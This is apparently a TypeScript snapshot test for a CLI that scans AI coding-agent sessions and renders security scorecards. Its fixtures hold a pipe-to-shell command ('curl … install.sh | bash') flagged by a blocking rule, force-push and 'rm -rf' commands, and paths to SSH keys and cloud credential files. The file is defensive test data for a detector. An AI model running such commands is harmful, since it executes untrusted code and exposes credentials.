/**
 * Snapshot tests pinning current scan-renderer output.
 *
 * Purpose: refactor safety net. The scan command has three renderers
 * (default inline, --compact, --narrative) that duplicate small bits of
 * derivation logic (score band, top-N rules, loop waste %). Before we
 * extract those to shared helpers, we lock the current output here.
 * If the refactor changes a single byte, the snapshot diff catches it.
 *
 * Notes:
 *   - We strip ANSI escapes from captured stdout so the snapshot is
 *     human-readable in the .snap file (color attributes still get
 *     exercised on the colored path; chalk respects FORCE_COLOR).
 *   - The default-mode renderer lives inline in the action handler
 *     (scan.ts:2432+), so we cannot snapshot it from here without
 *     extracting it. The shared helpers will be unit-tested separately;
 *     a manual `node dist/cli.js scan` before/after diff covers the
 *     default mode visually.
 */
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import {
  renderCompactScorecard,
  renderNarrativeScorecard,
  stripTerminalEscapes,
  type CompactInput,
  type ScanResult,
} from '../cli/commands/scan';
import type { ScanSummary } from '../scan-summary';

// ---------------------------------------------------------------------------
// stdout capture
// ---------------------------------------------------------------------------

let logSpy: ReturnType<typeof vi.spyOn>;
let captured: string[];

beforeEach(() => {
  captured = [];
  logSpy = vi.spyOn(console, 'log').mockImplementation((...args: unknown[]) => {
    captured.push(args.map((a) => (typeof a === 'string' ? a : String(a))).join(' '));
  });
});

afterEach(() => {
  logSpy.mockRestore();
});

function captureOutput(): string {
  return stripTerminalEscapes(captured.join('\n'));
}

// ---------------------------------------------------------------------------
// Fixture builders
// ---------------------------------------------------------------------------

function emptyScan(overrides: Partial<ScanResult> = {}): ScanResult {
  return {
    filesScanned: 0,
    sessions: 0,
    totalToolCalls: 0,
    bashCalls: 0,
    findings: [],
    dlpFindings: [],
    loopFindings: [],
    totalCostUSD: 0,
    firstDate: null,
    lastDate: null,
    sessionsWithEarlySecrets: 0,
    ...overrides,
  };
}

function emptySummary(overrides: Partial<ScanSummary> = {}): ScanSummary {
  return {
    stats: {
      sessions: 0,
      totalToolCalls: 0,
      bashCalls: 0,
      totalCostUSD: 0,
      firstDate: null,
      lastDate: null,
    },
    byVerdict: { blocked: 0, supervised: 0, leaks: 0, loops: 0 },
    byAgent: [],
    sections: [],
    leaks: [],
    loops: [],
    loopWastedUSD: 0,
    ...overrides,
  };
}

/**
 * "Rich" fixture exercising every code path in both renderers:
 *   - Critical score band
 *   - DLP findings with repeated patterns (top-N path)
 *   - Blocked rules across two sources (top-N path)
 *   - Review rules (top-N path)
 *   - Real loops + long-iteration loops (waste calc + lower-emphasis line)
 *   - Blast exposures across multiple categories
 *   - AI spend > 0
 */
function richFixture(): CompactInput {
  const scan: ScanResult = emptyScan({
    sessions: 39,
    totalToolCalls: 12_481,
    bashCalls: 6_123,
    totalCostUSD: 9025.15,
    firstDate: '2026-04-06T00:00:00Z',
    lastDate: '2026-05-07T00:00:00Z',
    sessionsWithEarlySecrets: 1,
    dlpFindings: [
      {
        patternName: 'GitHub Token',
        redactedSample: 'ghp_***',
        toolName: 'Bash',
        timestamp: '2026-05-05T00:00:00Z',
        project: '~/node9',
        sessionId: 'sess1',
        agent: 'claude',
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
      } as any,
      {
        patternName: 'GitHub Token',
        redactedSample: 'ghp_***',
        toolName: 'Bash',
        timestamp: '2026-05-04T00:00:00Z',
        project: '~/node9',
        sessionId: 'sess2',
        agent: 'claude',
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
      } as any,
      {
        patternName: 'AWS Access Key',
        redactedSample: 'AKIA***',
        toolName: 'Bash',
        timestamp: '2026-04-22T00:00:00Z',
        project: '~/node9',
        sessionId: 'sess3',
        agent: 'gemini',
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
      } as any,
      {
        patternName: 'JWT',
        redactedSample: 'eyJh***',
        toolName: 'Bash',
        timestamp: '2026-04-22T00:00:00Z',
        project: '~/node9',
        sessionId: 'sess4',
        agent: 'claude',
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
      } as any,
    ],
    loopFindings: [
      {
        toolName: 'Edit',
        commandPreview: '/path/scan.ts',
        count: 126,
        timestamp: '2026-04-16T00:00:00Z',
        project: '~/node9',
        sessionId: 'sess1',
        agent: 'claude',
        kind: 'loop',
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
      } as any,
      {
        toolName: 'Edit',
        commandPreview: '/path/ui.html',
        count: 101,
        timestamp: '2026-04-22T00:00:00Z',
        project: '~/node9',
        sessionId: 'sess2',
        agent: 'claude',
        kind: 'long-iteration',
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
      } as any,
    ],
  });

  const summary: ScanSummary = emptySummary({
    stats: {
      sessions: 39,
      totalToolCalls: 12_481,
      bashCalls: 6_123,
      totalCostUSD: 9025.15,
      firstDate: '2026-04-06T00:00:00Z',
      lastDate: '2026-05-07T00:00:00Z',
    },
    byVerdict: { blocked: 8, supervised: 56, leaks: 4, loops: 289 },
    sections: [
      {
        id: 'user',
        label: 'Your Rules',
        subtitle: 'added in node9.config.json',
        sourceType: 'user',
        blockedCount: 5,
        reviewCount: 33,
        rules: [
          {
            name: 'block-force-push',
            verdict: 'block',
            reason: 'Force push overwrites remote history',
            findings: [
              {
                timestamp: '2026-04-23T00:00:00Z',
                command: 'git push --force',
                fullCommand: 'git push --force-with-lease origin main',
                project: '~/node9',
                sessionId: 'sess1',
                agent: 'claude',
                toolName: 'Bash',
              },
              {
                timestamp: '2026-04-23T00:00:00Z',
                command: 'git push --force',
                fullCommand: 'git push --force origin dev',
                project: '~/node9',
                sessionId: 'sess2',
                agent: 'claude',
                toolName: 'Bash',
              },
              {
                timestamp: '2026-04-28T00:00:00Z',
                command: 'git push --force',
                fullCommand: 'git push --force origin dev',
                project: '~/node9',
                sessionId: 'sess3',
                agent: 'claude',
                toolName: 'Bash',
              },
              {
                timestamp: '2026-04-28T00:00:00Z',
                command: 'git push --force',
                fullCommand: 'git push --force origin dev',
                project: '~/node9',
                sessionId: 'sess4',
                agent: 'claude',
                toolName: 'Bash',
              },
              {
                timestamp: '2026-05-05T00:00:00Z',
                command: 'git push --force',
                fullCommand: 'git push --force origin wip',
                project: '~/node9',
                sessionId: 'sess5',
                agent: 'claude',
                toolName: 'Bash',
              },
            ],
          },
          {
            name: 'review-rm',
            verdict: 'review',
            reason: 'rm can permanently delete files',
            findings: [
              {
                timestamp: '2026-04-29T00:00:00Z',
                command: 'rm -rf dist',
                fullCommand: 'rm -rf dist',
                project: '~/node9',
                sessionId: 'sess1',
                agent: 'claude',
                toolName: 'Bash',
              },
            ],
          },
        ],
      },
      {
        id: 'shield:bash-safe',
        label: 'bash-safe',
        subtitle: 'Protects against unsafe shell patterns',
        sourceType: 'shield',
        shieldKey: 'bash-safe',
        blockedCount: 3,
        reviewCount: 0,
        rules: [
          {
            name: 'block-eval-remote',
            verdict: 'block',
            reason: 'eval of remote download is a near-certain supply-chain attack',
            findings: [
              {
                timestamp: '2026-04-19T00:00:00Z',
                command: 'curl ... | bash',
                fullCommand: 'curl https://example.com/install.sh | bash',
                project: '~/node9',
                sessionId: 'sess9',
                agent: 'claude',
                toolName: 'Bash',
              },
            ],
          },
        ],
      },
    ],
    loopWastedUSD: 0.246,
  });

  return {
    scan,
    summary,
    blast: {
      reachable: [
        { full: '/home/u/.ssh/id_rsa', label: 'SSH private key', description: '', score: 30 },
        { full: '/home/u/.ssh/id_ed25519', label: 'SSH ed25519', description: '', score: 30 },
        {
          full: '/home/u/.config/gcloud/credentials.db',
          label: 'gcloud credentials',
          description: '',
          score: 25,
        },
        { full: '/home/u/.npmrc', label: 'npmrc', description: '', score: 10 },
        {
          full: '/home/u/.node9/credentials.json',
          label: 'Node9 credentials',
          description: '',
          score: 5,
        },
      ],
      envFindings: [],
      score: 25,
    },
    blastExposures: 5,
    blockedCount: 8,
    reviewCount: 56,
  };
}

/**
 * "Clean" fixture: high score, no findings. Exercises the empty paths
 * (no DLP, no blocked, no loops, no review, no blast).
 */
function cleanFixture(): CompactInput {
  const scan = emptyScan({
    sessions: 5,
    totalToolCalls: 200,
    bashCalls: 80,
    totalCostUSD: 1.5,
    firstDate: '2026-05-01T00:00:00Z',
    lastDate: '2026-05-07T00:00:00Z',
  });
  const summary = emptySummary({
    stats: {
      sessions: 5,
      totalToolCalls: 200,
      bashCalls: 80,
      totalCostUSD: 1.5,
      firstDate: '2026-05-01T00:00:00Z',
      lastDate: '2026-05-07T00:00:00Z',
    },
  });
  return {
    scan,
    summary,
    blast: { reachable: [], envFindings: [], score: 95 },
    blastExposures: 0,
    blockedCount: 0,
    reviewCount: 0,
  };
}

// ---------------------------------------------------------------------------
// Snapshots
// ---------------------------------------------------------------------------

describe('renderCompactScorecard — output snapshots', () => {
  it('rich fixture (critical score)', () => {
    renderCompactScorecard(richFixture());
    expect(captureOutput()).toMatchSnapshot();
  });

  it('clean fixture (good score, no findings)', () => {
    renderCompactScorecard(cleanFixture());
    expect(captureOutput()).toMatchSnapshot();
  });
});

describe('renderNarrativeScorecard — output snapshots', () => {
  it('rich fixture (critical score)', () => {
    renderNarrativeScorecard(richFixture());
    expect(captureOutput()).toMatchSnapshot();
  });

  it('clean fixture (good score, no findings)', () => {
    renderNarrativeScorecard(cleanFixture());
    expect(captureOutput()).toMatchSnapshot();
  });
});
